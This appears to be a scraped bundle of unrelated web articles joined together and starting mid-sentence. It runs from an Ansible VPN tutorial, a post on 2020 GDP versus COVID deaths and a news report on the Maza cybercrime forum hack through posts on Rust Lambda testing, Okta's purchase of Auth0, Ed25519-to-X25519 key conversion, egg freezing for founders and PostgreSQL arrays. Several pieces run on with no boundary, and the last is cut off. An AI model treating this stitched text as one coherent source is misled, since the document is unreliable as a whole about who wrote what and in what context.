a sub-directory) and automatically activate the named<br># virtualenv<br>pyenv local ansible-tutorial<br>```</p><p>Install the `ansible` pip package, which will install various command-line tools, including `ansible-playbook`, which we'll use to run a "playbook" of commands that will set up a VPN server and client for us.</p><p>```bash<br>pip install ansible</p><p># Confirm installation worked<br>ansible --version<br>```</p><p># Get a Server</p><p>To use Ansible for a VPN server, we need... a server! Ansible could provision a server from a cloud provider for us (and I'll touch on this briefly later), but we'll keep our playbook hardware-provider-agnostic for now, so you can run it as easily against a cloud server as a Raspberry Pi on your home network. I'm going to [create a $5/month DigitalOcean droplet](https://www.digitalocean.com/docs/droplets/how-to/create/) to test against, but you could also [use Vagrant](https://docs.ansible.com/ansible/latest/scenario_guides/guide_vagrant.html) (to test against a local VM) or any server you can SSH to.</p><p>Testing Ansible playbooks against VMs, rather than a bare-metal machine, comes with an advantage — after you've written the playbook, you can start a new, empty VM and test the whole playbook start to finish to ensure that it works consistently.</p><p># Connecting to the Server with Ansible</p><p>Once you have your server or VM, take note of its IP address use it to create an `inventory.ini` file like the below:</p><p>```<br>[vpn]<br>vpn_server ansible_host=203.0.113.1 ansible_user=root<br>```</p><p>An [inventory file](https://docs.ansible.com/ansible/latest/user_guide/intro_inventory.html) tells Ansible what servers it can act upon and how to access them. Let's use the above inventory file as an example. When we run Ansible and target the `vpn` **group** of servers or the `vpn_server` **host**, it will try to connect to the server using a command like:</p><p>```bash<br>ssh root@203.0.113.1<br>```</p><p>So, if you can't SSH to the server, then Ansible won't be able to connect either!</p><p>Connecting to the server with an SSH key is strongly recommended! [Add your SSH key to your server](https://www.digitalocean.com/community/tutorials/how-to-set-up-ssh-keys-2) to connect without needing a password. If you must connect with a password, you can `sudo apt install sshpass` and then provide your SSH password when using Ansible by adding the `--ask-pass` flag to all ansible commands.</p><p>Let's test to make sure that Ansible can connect to the server:</p><p>```bash<br>ansible -i inventory.ini -m ping vpn<br>```</p><p>This runs the [ping Ansible module](https://docs.ansible.com/ansible/latest/collections/ansible/builtin/ping_module.html), targeting the `vpn` group of servers. You should see "pong" in the output, meaning that Ansible could connect to the server and the server has a Python installation that Ansible can use.</p><p># Ansible's Built-in Variables and Facts</p><p>There are other useful Ansible modules that we can use with the `ansible` command:</p><p>- The [setup module](https://docs.ansible.com/ansible/latest/collections/ansible/builtin/setup_module.html) fetches [system information, also known as "facts"](https://docs.ansible.com/ansible/latest/user_guide/playbooks_vars_facts.html), about the server. You can use these facts as variables in Ansible commands and playbooks.<br>- The [debug module](https://docs.ansible.com/ansible/latest/collections/ansible/builtin/debug_module.html) can evaluate variables, which is useful for... well, debugging!</p><p>Try running both of these modules with your server so you can see what facts and information Ansible makes available:</p><p>```bash<br>ansible -i inventory.ini -m setup vpn<br>ansible -i inventory.ini -m debug -a "var=hostvars" vpn<br>```</p><p>This was one of the most confusing parts for me when learning Ansible — figuring out what all these built-in variables and facts (like `groups`, `inventory_dir`, and `ansible_distribution`) were and how to find them.</p><p># Writing an Ansible Playbook</p><p>The `ansible` command lets you run [ad-hoc …</p></div></div>

<p>Last year was a historically bad year for many reasons, but to economists that badness is most visible in our widest measure of the economy: Gross Domestic Product. All issues with GDP aside, especially as a perfect measure of relative living standards, the annual real (inflation-adjusted) growth rate of GDP gives us a good picture of how much national economies were harmed by the pandemic, private behavior changes, and government restrictions (disentangling these three effects is hard — I will leave that to the academic journals rather than a blog post).</p>



<p>While GDP is reported with a lag of several months and is subject to revision, many countries have now reported full GDP data for 2020. For those that don’t follow GDP very closely, for a developed country an annual rate of growth of about 2% is pretty normal and respectable. For further context, in the US recent recessions had declines of -2.5% in 2009, -0.1% 1991, and -1.8% in 1982 (the 2001 recession never had an annual decline, only a few quarterly declines). While it is unusual for countries to go more than 10 years without a decline, it does happen. For example, Australia’s last annual decline was in 1991, when it declined -1.3%. But that’s unusual.</p>



<p>This chart shows the 2020 GDP growth rates (mostly negative, with one exception — Taiwan) for 2020 for most countries were I could find data. What this number shows us is the total amount of economic activity in 2020 compared with the total amount of economic activity in 2019 (adjusted for inflation, of course). I believe this is a better measure than others you might see, such as data that compares the level in the 4th quarters of 2020 and 2019 (a country could have had a terrible 2nd quarter but still gotten back close to the prior year level, and a simple Q-over-Q measure would miss that decline). As I did for the <a href="https://economistwritingeveryday.com/2020/11/18/third-quarter-check-in-covid-and-gdp/" target="_blank" rel="noreferrer noopener">3rd quarter data</a>, this chart also plots the cumulative COVID-19 death rates on the vertical axis.</p>

COVID-19 death data is from Our World in Data.</em></figcaption></figure>



<p>What can we learn from this data?</p>



<p>First of all, I would caution any suggestions about causation between these two numbers. The both reflect the same basic fact: how hard a country was hit by the pandemic. A country like Australia or Taiwan that performed well on both economic and health measures got these outcomes for the same reason: the weren’t hit hard by the pandemic. I will leave aside in this post questions about how much of this is due to government policy and how much of that policy could have been replicated in other countries. But Australia, Taiwan, and South Korea were, for a variety of reasons, able to avoid being hit hard by the pandemic.</p>



<p>Here is one thing that jumps out at me from the data: there are a large number of countries that had GDP declines between -2% and -4%, a level that is certainly bad but is not outside the range of a “normal” recession. But within this band of -2% to -4%, total COVID deaths range tremendously, from just 135 deaths per million people in Finland to over 1500 deaths per million in the US, or over 10 times as many. Notably also Sweden is almost 10 times Finland’s death rate and over 3 times Denmark’s death rate.</p>



<p>Could Sweden have looked more like Denmark and Finland with slightly different policies? Could the US? These questions have already been debated endlessly, and I suspect they will continue to be debated. It’s a question that is really hard to ever answer definitively, but it is worth asking.</p>



<p>Another pattern I notice is that many major Western European countries nicely fit on a line that extends from the worst outcome in the UK down through Italy, France, Germany, Denmark, and finally the best outcome in Norway. Among the largest European nations, only Spain does not fit perfectly on this line, though they are close. Once again, don’t infer too much about causation. For a variety of reasons that we don’t fully understand right now (and maybe never will, but science will try) the United Kingdom was hit especially hard. Both their economy and their health suffered considerably.</p>



<p>Could the UK, with fewer government restrictions, have ended up in a similar position to Belgium and Czechia? Those two countries also were hit extremely hard by the pandemic, but Czechia’s GDP decline was at least only half as bad as the UK. Or, without the government restrictions, would deaths have been even higher in the UK? That might seem unfathomable, but it is not. Right now 13 states in the US, with a combined population of 80 million people, have higher COVID death tolls than the UK, in some cases dramatically more (such as New Jersey, which is 45% higher than the UK).</p>



<p>We probably don’t need to say this again, but I will: 2020 was a really bad year. We are now starting to get a complete picture of just how bad it was. The variation across countries, and in some cases within countries or <a rel="noreferrer noopener" href="https://twitter.com/jmhorp/status/1366984212818059265" target="_blank">even with large US states</a>, is so large that social scientists will continue to study this issue for years to try and learn more about the causes. But let’s be cautious about quick analyses posted online now which claim they have identified the cause, or that there was no cause, only bad luck or demographic factors. Causation is a tricky thing to figure out.</p>

March 4, 2021 | https://therecord.media/maza-cybercrime-forum-hacked-user-data-dumped-online/ | <a href="https://web.archive.org/web/*/https://therecord.media/maza-cybercrime-forum-hacked-user-data-dumped-online/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
                    
<p>A hacker has breached Maza Faka, one of the oldest underground cybercrime forums active today, shut down its Tor-based website, and leaked the details of around 3,000 users in a PDF file posted on the forum’s front page.</p>



<p>The security breach, which took place yesterday, on March 3, 2021, resulted in the leak of sensitive details about the forum’s registered users.</p>



<p>According to a copy of the leaked PDF file obtained by <em>The Record</em>, details such as usernames, emails, account passwords, and social media IDs (ICQ, Skype, AIM, MSN, and Yahoo) were posted online.</p>



<p>Additionally, the PDF file also contained information about each user’s certificate file and certificate password, which the Maza forum was using as a form of a two-step verification process.</p>



<figure><img loading="lazy" width="1000" height="940" src="https://www-therecord.recfut.com/wp-content/uploads/2021/03/Maza-hacked.png" alt="" srcset="https://therecord.media/wp-content/uploads/2021/03/Maza-hacked.png 1000w, https://therecord.media/wp-content/uploads/2021/03/Maza-hacked-300x282.png 300w, https://therecord.media/wp-content/uploads/2021/03/Maza-hacked-768x722.png 768w" sizes="(max-width: 1000px) 100vw, 1000px"></figure>



<p>But while the Maza leak is small in size compared to other data breaches this year, it is likely one of the most important security incidents of 2021, as it has led to the broad exposure of data that may aid law enforcement agencies in tracking down former or current cybercriminals.</p>



<p>Dmitry Smilyanets, a threat intelligence analyst at <a href="https://www.recordedfuture.com/">Recorded Future</a> who helped <em>The Record</em> analyze the Maza data, said the PDF file contains authentic information, which he was able to use to link several Maza users to public social media profiles.</p>



<figure><img loading="lazy" width="988" height="390" src="https://www-therecord.recfut.com/wp-content/uploads/2021/03/social-media-profile.png" alt="" srcset="https://therecord.media/wp-content/uploads/2021/03/social-media-profile.png 988w, https://therecord.media/wp-content/uploads/2021/03/social-media-profile-300x118.png 300w, https://therecord.media/wp-content/uploads/2021/03/social-media-profile-768x303.png 768w" sizes="(max-width: 988px) 100vw, 988px"></figure>



<h2><strong>End of the “forum era”</strong></h2>



<p>Threat intelligence firm Flashpoint, which also spotted the Maza hack earlier today, said in a <a href="https://www.flashpoint-intel.com/blog/breelite-cybercrime-forum-maza-breached-by-unknown-attacker/">blog post</a> that multiple members of the underground cybercrime community are now discussing moving away from using emails as a means to register profiles, as these can be easily tracked back to their real-world identities.</p>



<p>Furthermore, Smilyanets told <em>The Record</em> that in Telegram channels, several respectable threat actors are now calling for an end to the “forum era.”</p>



<p>These calls come after several major underground forums had suffered similar security breaches over the past few months. This includes:</p>



<ul><li><strong>Joker’s Stash</strong> – has <a href="https://www.zdnet.com/article/jokers-stash-the-internets-largest-carding-forum-is-shutting-down/">recently shut down</a> after the FBI and Interpol <a href="https://www.zdnet.com/article/fbi-interpol-disrupt-jokers-stash-the-internets-largest-carding-marketplace/">seized four of its proxy servers</a> in December 2020.</li><li><strong>Verified </strong>– was temporarily <a href="https://www.flashpoint-intel.com/blog/new-mysterious-operators-usurp-elite-russian-hacker-forum-verified/">hacked and shut down</a> after hackers tricked the forum’s domain registrar into handing over control over the site’s domain to a threat actor.</li><li><strong>Exploit </strong>– suffered a security breach this week after hackers <a href="https://krebsonsecurity.com/2021/03/three-top-russian-cybercrime-forums-hacked/">hijacked one of its DDoS mitigation solutions</a>.</li></ul>



<p>But among all these, Maza stands head and shoulders above the others, mainly due to the severity of its breach but also due to its long-standing reputation in the Russian-speaking cybercrime underground.</p>



<h2><strong>One of the most reputable cybercrime forums today</strong></h2>



<p>While unknown to the general reader, the Maza Faka forum is one of the oldest, if not the oldest, cybercrime portals active today.</p>



<p>The forum, which launched way back in 2003, has served for almost two decades as a place to trade stolen card details (an activity called “carding”), but also functioned as a marketplace to advertise other services like e-commerce fraud, bank fraud, and cash-out services.</p>



<p>Access to the forum has always been limited to a selected few.</p>



<p>“Registering on the forum requires a significant upfront fee, as well as several vouchers from current members who are in good standing on the forum and become financially responsible for the invited person in the case of disputes,” Smilyanets told <em>The Record</em>.</p>



<p>“Primarily attributed to such a strict registration policy, monetary disputes are rare compared with most other forums. As a result, only senior and established members of the hacking underworld are capable of gaining access.”</p>



<p>But, according to a Recorded Future threat intel bulletin, the forum’s activity has waned in recent years, and new card breaches or POS malware strains were rarely posted on the site anymore.</p>



<p>Today, the Maza forum primarily serves as a reputation index for the top dogs of the cybercrime underground, many of whom use their Maza profiles to vouch for their reputations.</p>



<p>As a result, any information on Maza users leaked this week might help uncover years-worth of cybercrime campaigns and some of the oldest and long-standing threat actors today.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <p>In the system I'm building there are a significant amount of SQS messages that need to be processed asynchronously and Lambda is a really good fit for that. It is perfect for spiky workloads. You can control max parallelism easily. And it now has a native integration where Lambda functions are invoked with pending SQS messages without any extra work on your part.</p>
<p>Lambda's great. I think it's time to declare it boring. In the "choose boring technology" sense. As in it's a robust and well-worn solution.</p>
<p>But a significant problem I had was that most of my code is Rust. The Lambda experience with the major languages (e.g. Python) is categorically better. There are fewer gotchas, many more examples, and it seems especially true when trying to use the higher level tooling out there which I will get into in a minute.</p>
<p>Re-writing the pieces in another language like Python was not tempting as these Lambda functions are handling all the same data structures, re-using business logic, and calling the same dependencies as the main code base. It could be done, of course. But having multiple pieces of code doing the same things can be a giant hassle/waste (for small teams especially). And Rust is just far more maintainable to me.</p>
<p>Those reasons to stick with Rust outweighed any deployment inconveniences or performance arguments. </p>
<p>Performance-wise, Rust is surely faster than my main other candidate Python. So, maybe I'd pay significantly less money in the long run? Especially now that Lambda is billing at 1ms increments? I love that this happened but it's not really a significant factor in this case. The actual processing time is dominated by calling SQS, gRPC services, and/or DynamoDB.</p>
<p>Cost decisions all depend on the use case and expected load, of course, but the difference I projected is a not significant problem to me in the real dollars it would translate to. Something like Python would be completely fine here. I projected it would only increase the 30-40ms average runtime by around 10%. Waiting around is pretty efficient in any language. The great news recently was Lambda moving from 100ms billing increments to 1ms: a boon here regardless of the programming language. Very cool.</p>
<p>On a related note, I'm about to create something with Cloudflare Workers (using Rust/wasm) and that's quite a different billing model. Unlike Lambda, if you're awaiting subrequests, it doesn't actively count against your CPU time for that invocation. Sweet. It comes with trade-offs, of course. I'll probably write about what I learn in the future. I bet I'm adopting it for the directly customer-facing layer as my experiments so far on that platform have been pretty positive.</p>
<p>For Lambda and Rust, I ended up trying a number of the higher level frameworks and tools. The biggest factors in the decision were the deployment and testing support. I don't mind some setup pain if there are safe deployment mechanisms and fast, local testing that very closely approximates the real environment.</p>
<p><a href="https://www.serverless.com/">Serverless</a> and <a href="https://aws.amazon.com/serverless/sam/">AWS SAM</a> are the two big ones that work with Rust and provide some local testing capability. There are a lot of other Python-centric ones. If you take local/mock testing out of the requirements, there are also some good infrastructure-as-code options: I'm eventually going to investigate CDK, Terraform, and Pulumi (which I use elsewhere). I have limited time and can't research a comprehensive survey of all of the options, unfortunately. I wish I could.</p>
<p>Fast iteration while developing is really important to me but none of those frameworks were fast for testing. The CLIs themselves take multiple seconds to respond for even simple tasks. Once Rust is involved, you're now into cross-compiling (to <a href="https://doc.rust-lang.org/edition-guide/rust-2018/platform-and-target-support/musl-support-for-fully-static-binaries.html">musl</a>) and on top of that delay the frameworks are building/using Docker containers behind the scenes to run the tests. For a week or so, I was just running the lambci Docker image directly in automated integration tests, but that was not cutting it either. Still all too slow, the cross-compilation especially.</p>
<p>I ended up eschewing the frameworks altogether for local testing which is what I mainly want to write about.</p>
<p>There's now a thin layer that intakes SQS messages and parses the JSON payload into a strongly typed Rust data structure. This is in the <code>bootstrap</code> binary that Lambda runs. It reads environment variables for configuration. Locally, there's a completely separate binary that reads configurations from a dynamically generated file and polls for messages from a Redis queue (using LPOP/BLPOP). In both cases, the parsed queue payload is pushed into the 'real' code base which is identical in both cases. A classic "shim":</p>
<p><img src="https://www.peakscale.com/serverless-rust.png"></p><p>It's worked out well. I folded it into the same test framework that I wrote for traditional services. Redis is just another process that is launched from a group blueprint. The framework can launch groups of arbitrary binaries (either my own artifacts or system binaries like Redis) and Docker containers. Unique ports are reserved on the fly (via a SQLite database that is unique to each node) and written into the dynamically created configuration files. The processes can discover each other by role name so that you don't have to test one process at a time and mock dependencies - they can work together just as they would in the real system. The integration test itself can look up the same configurations and feed the test messages into Redis.</p>
<p>Importantly, many groups can be launched simultaneously, i.e., each integration test can launch its own group of processes. I can have hundreds of these running thousands of Unix processes even on my laptop. The Unix process model works quite well. Use it!</p>
<p>And that means cross-compiling to musl only happens for real deployments to Lambda. Anything I'm in the middle of coding is incrementally compiled and local (either OSX or Linux). The tests can be run nearly instantly. Both Redis and Rust binaries are extremely fast to execute and get to an operational state. The actual process wrangling is handled by the extremely fast <a href="http://smarden.org/runit/">runit</a> set of tools which the group management code triggers. No more waiting on those Lambda testing framework's slow local testing or, worse, actually deploying to Lambda to get basic iterative feedback.</p>
<p>It's just unacceptable to me to wait more than a few seconds. Anything that requires more time tends to mean you get sucked into some distraction. When I'm coding I want to stay in the flow of it. Getting instant feedback from testing is awesome. Getting instant feedback from tests that are running exactly the same thing as production? That is just perfect. Unfortunately in this case, unlike my web services, it required faking something out (substituting Redis in for SQS) but I think it's low risk.</p>
<p>Even so, before final deployment I still choose to run the test suite against something with almost exact parity as production (basically only differing from production in stored database data). There could always be some difference. On teams I've been on, we've caught a few problems in those stages.</p>
<p>I also believe in the 'testing in production' ideas out there, to an extent. As long as we're not talking about <em>only</em> testing in production which usually makes no sense. There are still a number of problems you can catch ahead of time with a stage right before production that matches the infrastructure. In my case it's going to add around 10 minutes per actual deployment and I'm just fine with that given that it's automated and the potential value from avoiding an outage. But everyone has their own trade-offs to think about (<a href="https://www.peakscale.com/context/">context</a> matters).</p>
<p>Meanwhile both my local development flow and the longer full integration test suite were both sped up massively.</p>

              <p>This week, <a href="https://auth0.com/">Auth0</a> was acquired by <a href="https://www.okta.com/">Okta</a>, the largest company in the Identity &amp; Access Management space. &nbsp;After being founded in only 2014 and sold for a cool $6.5 billion, this is yet another example of how technology is increasingly being adopted by developers and finding it's way into the business in a bottom-up fashion.</p><h2 id="what-is-identity-access-management">What Is Identity &amp; Access Management?</h2><p>Many of the applications which you use or develop will be protected with username and password access. &nbsp;The username represents your individual <em>identity,</em> which will control how you are allowed to use the system and the data that you have access too, and the password of course controls your access to that identity.</p><p>It may seem that developing a username and password function is simple, but in reality there is a lot of effort and complexity to this. &nbsp;Not only do you need to implement the login feature, but also the logouts, password resets, multi-factor authentication, social logins and the ability to disable users to name just a few. Being authentication related, all of this needs to be developed securely, which is a skill in itself.</p><p>At an enterprise level, businesses also need to control access across an entire portfolio of applications, ensuring that the right people in the right job roles have access to the right systems. &nbsp;Technically, this will often mean that we need to develop integration between applications, internal directories and single sign on systems so that these things can be controlled and audited centrally. &nbsp;This is further development which needs to take place, none of which really adds value to your users.</p><p>Whilst implementing Identity &amp; Access Management does require lots of work and complexity, it is a task which overlaps greatly from application to application and organisation to organisation. &nbsp;Therefore, there have been a number of solutions developed which provide this through either on premise software deployment or more recently as a service.</p><p>Example products in this space include <a href="https://www.pingidentity.com/">Ping Identity</a> and <a href="https://www.okta.com/">Okta</a>. &nbsp;Both of these products and organisations started life and still punch hardest in the enterprise space, where the task is to protect thousands of applications and tens of thousands of users in a secure, controlled and compliant way. &nbsp;And historically they have done a good job at this, jointly protecting billions of user accounts.</p><h2 id="the-auth0-approach">The Auth0 Approach</h2><p>Rather than focus directly on enterprise, the Auth0 approach and their ultimate success was very much to focus on winning developer mindshare with a bottom-up adoption and sale.</p><p>Auth0 allows developers to drop in the identity and access management features directly into their applications, avoiding all of the development work whilst ensuring a secure implementation. &nbsp;The experience for developers is very good, and the frontend highly customisable so that security can be implemented without restricting their user experience. &nbsp;All of the documentation, guides and presentation are also oriented towards developers, and the business is very culturally aligned and tuned into the development community.</p><p>For all of these reasons, developers have flocked to Auth0 as their preferred solution for Identity &amp; Access Management.</p><p>In addition, whereas the competition are very enterprise focussed in their approach, Auth0 is much more consumer focussed. &nbsp;For instance, rather than being the technology by which enterprises secure their internal line of business applications, Auth0 has historically more naturally been at home when used in websites and mobile applications aimed at consumers. &nbsp;</p><p>Ultimately, Okta have concluded that these are both trends they need to buy into in todays developer led and digital world. &nbsp;</p><h2 id="what-can-we-learn-from-this">What Can We Learn From This?</h2><p>As technology leaders, the success and rapid adoption of Auth0 shows how new technology is increasingly entering the organisation through developers, who are consuming SaaS services and baking them into their applications. &nbsp;Of course this brings risk and governance considerations, but also shows how companies need to change to allow and support this innovation if they are to remain competitive. </p><p>The success of Auth0 also shows how enterprise IT is being turned inside out, taking previously internal line of business applications and data, and exposing this outside of the business so users and consumers can interact with it through digital channels. &nbsp;This is the flip side of consumerisation of enterprise IT, where we are taking enterprise IT and enabling it for direct use by customers. </p><p>Finally, this is of course another example of the rapid digitisation of the world economy, where companies are building more web and mobile applications. Intelligent consumption of developer accelerators and SaaS services like Auth0 is really necessary to get to market quickly and remain competitive. &nbsp;</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
            <!--kg-card-begin: markdown--><p><a href="https://twitter.com/Benjojo12">@Benjojo12</a> and I are building <a href="https://docs.google.com/document/d/11yHom20CrsuX8KQJXBBw04s80Unjv8zCg_A7sPAX_9Y">an encryption tool</a> that will also support SSH keys as recipients, because everyone effectively already publishes their SSH public keys <a href="https://github.com/FiloSottile.keys">on GitHub</a>.</p>
<p>For <a href="https://tools.ietf.org/html/rfc8332">RSA keys</a>, this is <a href="https://eprint.iacr.org/2011/615.pdf">dangerous</a> but straightforward: a PKCS#1 v1.5 signing key is the same as an OAEP encryption key.</p>
<p><a href="https://tools.ietf.org/html/draft-ietf-curdle-ssh-ed25519-ed448-08#section-4">Ed25519 keys</a>, though, are specifically made to be used with <a href="https://tools.ietf.org/html/rfc8032">EdDSA, the Edwards-Curve Digital Signature Algorithm</a>. To encrypt to them we'll have to choose between converting them to X25519 keys to do Ephemeral-Static Diffie-Hellman, and devising our own Diffie-Hellman scheme that uses Ed25519 keys.</p>
<p>While the latter is a totally viable strategy—you can do Ephemeral-Static Diffie-Hellman on twisted Edwards curves—I wanted to reuse the X25519 codepath, so I opted for the former.</p>
<p>First, we need to understand the difference between Ed25519 and X25519. For that I recommend <a href="https://eprint.iacr.org/2017/212.pdf"><em>Montgomery curves and their arithmetic</em></a> by Craig Costello and Benjamin Smith, which is where I learned most of the underlying mechanics of Montgomery curves. The high level summary is that <strong>the twisted Edwards curve used by Ed25519 and the Montgomery curve used by X25519 are <em>birationally equivalent</em></strong>: you can convert points from one to the other, and they behave the same way. The main difference is that on Montgomery curves you can use the Montgomery ladder to do scalar multiplication of x coordinates, which is fast, constant time, and sufficient for Diffie-Hellman. Points on the Edwards curve are usually referred to as <code>(x, y)</code>, while points on the Montgomery curve are usually referred to as <code>(u, v)</code>.</p>
<p>RFC 7748 conveniently <a href="https://tools.ietf.org/html/rfc7748#page-5">provides</a> the formulas to map <code>(x, y)</code> Ed25519 Edwards points to <code>(u, v)</code> Curve25519 Montgomery points and vice versa.</p>
<pre><code>(u, v) = ((1+y)/(1-y), sqrt(-486664)*u/x)
(x, y) = (sqrt(-486664)*u/v, (u-1)/(u+1))
</code></pre>
<p>So that's what a <a href="https://tools.ietf.org/html/rfc7748#section-5">X25519 public key</a> is: a u coordinate on the Curve25519 Montgomery curve obtained by multiplying the basepoint by a secret scalar, which is the private key. An <a href="https://tools.ietf.org/html/rfc8032#section-5.1.5">Ed25519 public key</a> instead is the compressed encoding of a <code>(x, y)</code> point on the Ed25519 Edwards curve obtained by multiplying the basepoint by a secret scalar derived from the private key. (An Ed25519 private key is hashed to obtained two secrets, the first is the secret scalar, the other is used elsewhere in the signature scheme.)</p>
<p>If we use the same secret scalar to calculate both an Ed25519 and an X25519 public key, we will get two points that are birationally equivalent, so we can convert from one to the other with the maps above. There is one catch though: you might have noticed that <strong>while we have both x and y coordinates for the Ed25519 public key, we only have the u coordinate for the X25519 key</strong>. That's because u coordinates are enough to do Diffie-Hellman (which is the core insight of Curve25519).</p>
<p>For every valid u coordinate, there are two points on the Montgomery curve. The same is true of y coordinates and the Edwards curve. (When you use the birational map, y coordinates map to u coordinates and vice-versa.) That's why we can encode Ed25519 public keys as a y coordinate and a "sign" bit in place of the full x coordinate.</p>
<p>This means that for each X25519 public key, there are two possible secret scalars (<code>k</code> and <code>-k</code>) and two equivalent Ed25519 public keys (with sign bit 0 and 1, also said to be one the negative of the other).</p>
<p>By the way, this all works because the basepoints of the Montgomery and Edwards curves are equivalent. Interestingly enough, the spec made a mistake and picked the wrong v coordinate for the Montgomery basepoint, so that the Montgomery basepoint maps to the negative of the Edwards basepoint. <a href="https://www.rfc-editor.org/errata/eid4730">It's fixed in an errata</a> but no one cares about Montgomery v coordinates anyway.</p>
<p>It should be mentioned that there is precedent for converting keys between the two curves: <a href="https://signal.org/docs/specifications/xeddsa/">Signal's XEd25519</a>. They do the opposite of what we want to do though, they use an X25519 key for EdDSA. That comes with an issue: an X25519 public key does not carry a v coordinate, so it can map to two Ed25519 keys. They solve it by defining the Edwards point sign bit to be 0, and then negating the Edwards secret scalar if it would generate a point with positive sign. (It also comes with more issues due to not having the other secret that you derive from an EdDSA private key, but that's out of scope. I like the diagram in <a href="https://blog.mozilla.org/warner/2011/11/29/ed25519-keys/">this blog post</a> if you are curious.)</p>
<p>I recommend reading both <a href="https://signal.org/docs/specifications/xeddsa/#elliptic-curve-conversions">section 2.3 of the XEdDSA spec</a> and <a href="https://crypto.stackexchange.com/a/62881/6740">this StackExchange answer</a> if things don't feel clear at this point.</p>
<p>Getting back to our use case, it turns out that it's pretty easy to use an Ed25519 public key for X25519, because <strong>an Ed25519 public key maps to a single X25519 public key</strong>, and the Ed25519 secret scalar will be one of the two valid X25519 private keys for that public key.</p>
<p>To encrypt, we take the y coordinate of the Ed25519 public key and we convert it to a Montgomery u coordinate, which we use as an <a href="https://tools.ietf.org/html/rfc7748#section-5">X25519</a> public key for Ephemeral-Static Diffie-Hellman.</p>
<pre><code>u = (1 + y) / (1 - y)

ephemeral_secret = read(/dev/urandom, 32)
ephemeral_share = X25519(ephemeral_secret, BASEPOINT)
shared_secret = X25519(ephemeral_secret, u)
</code></pre>
<p>To decrypt, we derive the secret scalar <a href="https://tools.ietf.org/html/rfc8032#section-5.1.5">according to the Ed25519 spec</a>, and simply use it as an X25519 private key in Ephemeral-Static Diffie-Hellman.</p>
<pre><code>secret_scalar = SHA-512(Ed25519_key)[:32]
shared_secret = X25519(secret_scalar, ephemeral_share)
</code></pre>
<p>The two peers might end up with different v coordinates, if they were to calculate them, but in X25519 the shared secret is just the u coordinate, so no one will notice.</p>
<p>What remains open for future work is checking for cross-protocol attacks. The only one that really concerns me is if a partial decryption oracle (where you can submit files to an endpoint and it will tell you if they decrypt successfully) allows generating an Ed25519 signature that can be used to log in to an SSH server. I can't see such an attack, but if you can, <a href="https://twitter.com/FiloSottile">let me know on Twitter</a>.</p>
<p>P.S. Looks like libsodium already <a href="https://libsodium.gitbook.io/doc/advanced/ed25519-curve25519">supports this kind of Ed25519 to Curve25519 conversion</a>, which is great as it makes it easy for languages with libsodium bindings (most of them) to implement <em>age</em>, and it gets us something to test against.</p>

				<p>Because of our biological clocks, women need to consider the timing of children a lot more urgently than men.</p><p>Startups take much longer than you’d think before they become successful. You should have a 5-10 year horizon, at least.</p><p>And the period between when you start the startup and when you can relax a little is grueling and all-consuming. The focus that’s required at first will probably force you to cut back on almost everything in your life, making a healthy work/life balance nearly impossible.</p><p>Startups are also unpredictable. In the early stages, you can’t plan too far in the future and arrange your life neatly around your plans, as you might with a job as an employee in the corporate world.</p><p>So you are working around the clock—so busy that you can’t focus on much outside of work, not knowing what startup disaster is around the corner, and maybe with no end in sight for years. But you know you want a family someday, either with your current partner or someone you haven’t even had the time to meet yet.</p><p>Because startups can cause you to neglect much of your own life, women founders need to be really proactive about their fertility. Especially if you want to buy more time before the window shuts on your childbearing years.</p><p>My advice: Freeze your eggs/embryos.</p><p>I wish I had. Life with my company whizzed by and it wasn’t until my late 30s when I had a child. After a year, I started working on baby #2. Three miscarriages later, I finally woke up to the urgency of the situation and went to a fertility doctor.</p><p>The next few years were consumed by IVF cycles. My obsession to have another baby grew with each failed cycle. I’d be on an emotional roller coaster waiting for the various results, praying that this time was the magical one. It never was. My eggs were just too old, I think. After 8 rounds with not one viable embryo to transfer, I decided I had to move on, to focus on my kid and all the really great things in my life. But the what-ifs still haunt me, privately.</p><p>Aspects of getting your eggs retrieved and/or frozen can be really awful. It’s extremely expensive if not covered by your medical insurance. The drugs can wreak havoc on moods and emotions. Between all the doctor’s appointments and the various shots (which cause serious bruising) you have to give yourself several times each day, it’s quite time consuming. &nbsp;And it’s stressful. At least it was for me. The stakes feel so high.</p><p>But nothing is as awful as it not working out. It’s a type of depressing that’s difficult to describe concisely.</p><p>It might seem weird or somehow frivolous to freeze your eggs—and especially to freeze embryos if you’re already married. (Though it’s becoming more mainstream as companies offer egg freezing as an employee benefit.) But freezing is worth it simply because it gives you more options as you get older.</p><p>Until they go through it themselves, few people realize how hard Mother Nature can be in the fertility department. The older you are, the tougher the blows. So if you want a biological child, the best thing you can do is prepare. You don’t want to be like me and wake up one day and it’s too late.</p>

					<div><p>While migrating from Oracle to PostgreSQL, most of the developers ask about the options available in Handling Global associative arrays in PostgreSQL. It might get challenging if the variables need to be accessible in the Exception block. To avoid developers from finding it difficult while performing conversions of PL/SQL from Oracle to PostgreSQL, we are writing this blog post to demonstrate the workarounds available with not much of additional programming effort. <img loading="lazy" src="https://www.migops.com/blog/wp-content/uploads/2021/02/Word-Art.jpeg" alt="" width="500" height="343"></p>
<p>By the way, the fact to note after reading this blog post is that, several features you want to observe in PostgreSQL during migrations or Code conversions are available without the need of an additional Enterprise license with PostgreSQL (which could create a vendor lock-in).</p>

<p>Ask us about possibilities with Community PostgreSQL (Open Source) before switching to an Enterprise licensing. 🙂</p>

<p><b>What is an Associative Array ?</b></p>
<p>Before getting to the workarounds, let us understand what is an associative array. In programming languages, an associative array may either be called a <strong>map</strong> or a <strong>dictionary</strong>. Associative array is a collection of (key, value) pairs where a key associates to a value. This association between a key and a value may be referred to as mapping. The key can either be of a text or a numeric type that can be mapped to any value type.&nbsp;</p>
<p><b>PostgreSQL Array type</b></p>
<p>PL/pgSQL in PostgreSQL allows us to declare a variable as an ARRAY type. This ARRAY can be either a <strong>base</strong> or a <strong>custom</strong> type. For example, if we want to store a list of <strong>PINCODE</strong> values, then, we can declare the variable as <strong>v_pincode INT[]</strong>. Once we declare this variable, then, we can load all the pincode values from a table/view/function into this array.&nbsp;</p>
<p>We can also initialize the <strong>v_pincode</strong> array type with a static set of pincode values. Here, the <strong>v_pincode</strong> holds all the values and we can fetch a specific state’s pincode value, by providing an index. Which means, if we want to access the 1st state pincode, then, we can access the value using <strong>v_pincode[1]</strong>. If we want to access the pincode value of 3rd state, then, we have to pass the index value 3 using <strong>v_pincode[3]</strong>.</p>
<p>Here is a sample code to illustrate the above with an example.</p>
